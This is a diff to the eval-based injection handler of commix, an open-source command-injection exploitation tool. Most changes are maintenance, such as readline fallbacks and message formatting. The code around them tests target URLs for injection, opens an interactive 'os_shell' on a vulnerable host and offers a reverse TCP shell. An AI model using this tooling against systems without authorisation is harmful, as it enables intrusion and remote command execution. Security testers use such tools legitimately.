@@ -3,7 +3,7 @@
 
 """
 This file is part of commix (@commixproject) tool.
-Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
+Copyright (c) 2014-2016 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix
 
 This program is free software: you can redistribute it and/or modify
@@ -22,7 +22,6 @@ import random
 import base64
 import urllib
 import urllib2
-import readline
 
 from src.utils import menu
 from src.utils import logs
@@ -40,21 +39,38 @@ from src.core.injections.results_based.techniques.eval_based import eb_payloads
 from src.core.injections.results_based.techniques.eval_based import eb_enumeration
 from src.core.injections.results_based.techniques.eval_based import eb_file_access
 
+readline_error = False
+try:
+  import readline
+except ImportError:
+  if settings.IS_WINDOWS:
+    try:
+      import pyreadline as readline
+    except ImportError:
+      readline_error = True
+  else:
+    try:
+      import gnureadline as readline
+    except ImportError:
+      readline_error = True
+  pass
+
+
 """
-The "eval-based" injection technique on Classic OS Command Injection.
+The "eval-based" code injection technique on classic OS command injection.
 """
 
 """
 The "eval-based" injection technique handler.
 """
 def eb_injection_handler(url, delay, filename, http_request_method):
-  
+
   counter = 1
   vp_flag = True
   no_result = True
   export_injection_info = False
   injection_type = "Results-based Command Injection"
-  technique = "eval-based injection technique"
+  technique = "eval-based code injection technique"
 
   for item in range(0, len(settings.EXECUTION_FUNCTIONS)):
     settings.EXECUTION_FUNCTIONS[item] = "${" + settings.EXECUTION_FUNCTIONS[item] + "("
@@ -62,7 +78,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
 
   url = eb_injector.warning_detection(url, http_request_method)
 
-  sys.stdout.write("(*) Testing the "+ technique + "... ")
+  sys.stdout.write("(*) Testing the " + technique + "... ")
   sys.stdout.flush()
 
   i = 0
@@ -88,24 +104,23 @@ def eb_injection_handler(url, delay, filename, http_request_method):
 
         # Define alter shell
         alter_shell = menu.options.alter_shell
-          
+
         try:
           if alter_shell:
-            # Eval-based c -alter shell- decision payload (check if host is vulnerable).
+            # Classic -alter shell- decision payload (check if host is vulnerable).
             payload = eb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)
           else:
-            # Eval-based decision payload (check if host is vulnerable).
+            # Classic decision payload (check if host is vulnerable).
             payload = eb_payloads.decision(separator, TAG, randv1, randv2)
 
           suffix = urllib.quote(suffix)
-
           # Fix prefixes / suffixes
           payload = parameters.prefixes(payload, prefix)
           payload = parameters.suffixes(payload, suffix)
           # Fixation for specific payload.
           if ")%3B" + urllib.quote(")}") in payload:
             payload = payload.replace(")%3B" + urllib.quote(")}"), ")" + urllib.quote(")}"))
-          payload = payload + "" + TAG + ""
+          payload = payload +  TAG + ""
 
           if menu.options.base64:
             payload = urllib.unquote(payload)
@@ -153,20 +168,20 @@ def eb_injection_handler(url, delay, filename, http_request_method):
             float_percent = "{0:.1f}".format(round(((i*100)/(total * 1.0)),2))
 
             if shell == False:
-              sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + float_percent +"%" + " ]")  
+              sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + float_percent + "%" + " ]")  
               sys.stdout.flush()
 
-            if percent == 100:
+            if str(float_percent) == "100.0":
               if no_result == True:
                 percent = Fore.RED + "FAILED" + Style.RESET_ALL
               else:
-                percent = str(float_percent)+"%"
+                percent = str(float_percent)+ "%"
             elif len(shell) != 0:
               percent = Fore.GREEN + "SUCCEED" + Style.RESET_ALL
             else:
-              percent = str(float_percent)+"%"
+              percent = str(float_percent)+ "%"
 
-            sys.stdout.write("\r(*) Testing the "+ technique + "... " +  "[ " + percent + " ]")  
+            sys.stdout.write("\r(*) Testing the " + technique + "... " +  "[ " + percent + " ]")  
             sys.stdout.flush()
             
         except KeyboardInterrupt: 
@@ -219,10 +234,10 @@ def eb_injection_handler(url, delay, filename, http_request_method):
           counter = counter + 1
           
           # Print the findings to terminal.
-          print Style.BRIGHT + "\n(!) The ("+ http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to "+ injection_type + "." + Style.RESET_ALL
-          print "  (+) Type : "+ Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
-          print "  (+) Technique : "+ Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
-          print "  (+) Payload : "+ Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
+          print Style.BRIGHT + "\n(!) The (" + http_request_method + ")" + found_vuln_parameter + header_name + the_type + " is vulnerable to " + injection_type + "." + Style.RESET_ALL
+          print "  (+) Type : " + Fore.YELLOW + Style.BRIGHT + injection_type + Style.RESET_ALL + ""
+          print "  (+) Technique : " + Fore.YELLOW + Style.BRIGHT + technique.title() + Style.RESET_ALL + ""
+          print "  (+) Payload : " + Fore.YELLOW + Style.BRIGHT + re.sub("%20", " ", payload) + Style.RESET_ALL
 
           # Check for any enumeration options.
           if settings.ENUMERATION_DONE == True :
@@ -238,7 +253,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
               else:
                 if enumerate_again == "":
                   enumerate_again = "enter"
-                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL
+                print Back.RED + "(x) Error: '" + enumerate_again + "' is not a valid answer." + Style.RESET_ALL + "\n"
                 pass
 
           else:
@@ -260,7 +275,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
               else:
                 if file_access_again  == "":
                   file_access_again  = "enter"
-                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL
+                print Back.RED + "(x) Error: '" + file_access_again  + "' is not a valid answer." + Style.RESET_ALL + "\n"
                 pass
           else:
             eb_file_access.do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
@@ -279,11 +294,19 @@ def eb_injection_handler(url, delay, filename, http_request_method):
             if gotshell in settings.CHOISE_YES:
               print ""
               print "Pseudo-Terminal (type '" + Style.BRIGHT + "?" + Style.RESET_ALL + "' for available options)"
+              if readline_error:
+                checks.no_readline_module()
               while True:
                 try:
                   # Tab compliter
-                  readline.set_completer(menu.tab_completer)
-                  readline.parse_and_bind("tab: complete")
+                  if not readline_error:
+                    readline.set_completer(menu.tab_completer)
+                    # MacOSX tab compliter
+                    if getattr(readline, '__doc__', '') is not None and 'libedit' in getattr(readline, '__doc__', ''):
+                      readline.parse_and_bind("bind ^I rl_complete")
+                    # Unix tab compliter
+                    else:
+                      readline.parse_and_bind("tab: complete")
                   cmd = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """os_shell""" + Style.RESET_ALL + """) > """)
                   cmd = checks.escaped_cmd(cmd)
                   if cmd.lower() in settings.SHELL_OPTIONS:
@@ -292,7 +315,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                       if no_result == True:
                         return False
                       else:
-                        return True
+                        return True 
                     elif os_shell_option == "quit":                    
                       sys.exit(0)
                     elif os_shell_option == "back":
@@ -301,6 +324,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                     elif os_shell_option == "os_shell": 
                         print Fore.YELLOW + "(^) Warning: You are already into an 'os_shell' mode." + Style.RESET_ALL + "\n"
                     elif os_shell_option == "reverse_tcp":
+                      settings.REVERSE_TCP = True
                       # Set up LHOST / LPORT for The reverse TCP connection.
                       lhost, lport = reverse_tcp.configure_reverse_tcp()
                       while True:
@@ -313,12 +337,14 @@ def eb_injection_handler(url, delay, filename, http_request_method):
                           if result == 0:
                             return False
                           elif result == 1 or result == 2:
+                            settings.REVERSE_TCP = False
                             go_back_again = True
                             break
                         # Command execution results.
                         response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, alter_shell, filename)
                         # Evaluate injection results.
                         shell = eb_injector.injection_results(response, TAG)
+                        print shell
                         if menu.options.verbose:
                           print ""
                         print Back.RED + "(x) Error: The reverse TCP connection has been failed!" + Style.RESET_ALL
@@ -364,7 +390,7 @@ def eb_injection_handler(url, delay, filename, http_request_method):
             else:
               if gotshell == "":
                 gotshell = "enter"
-              print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL
+              print Back.RED + "(x) Error: '" + gotshell + "' is not a valid answer." + Style.RESET_ALL + "\n"
               pass
             
             
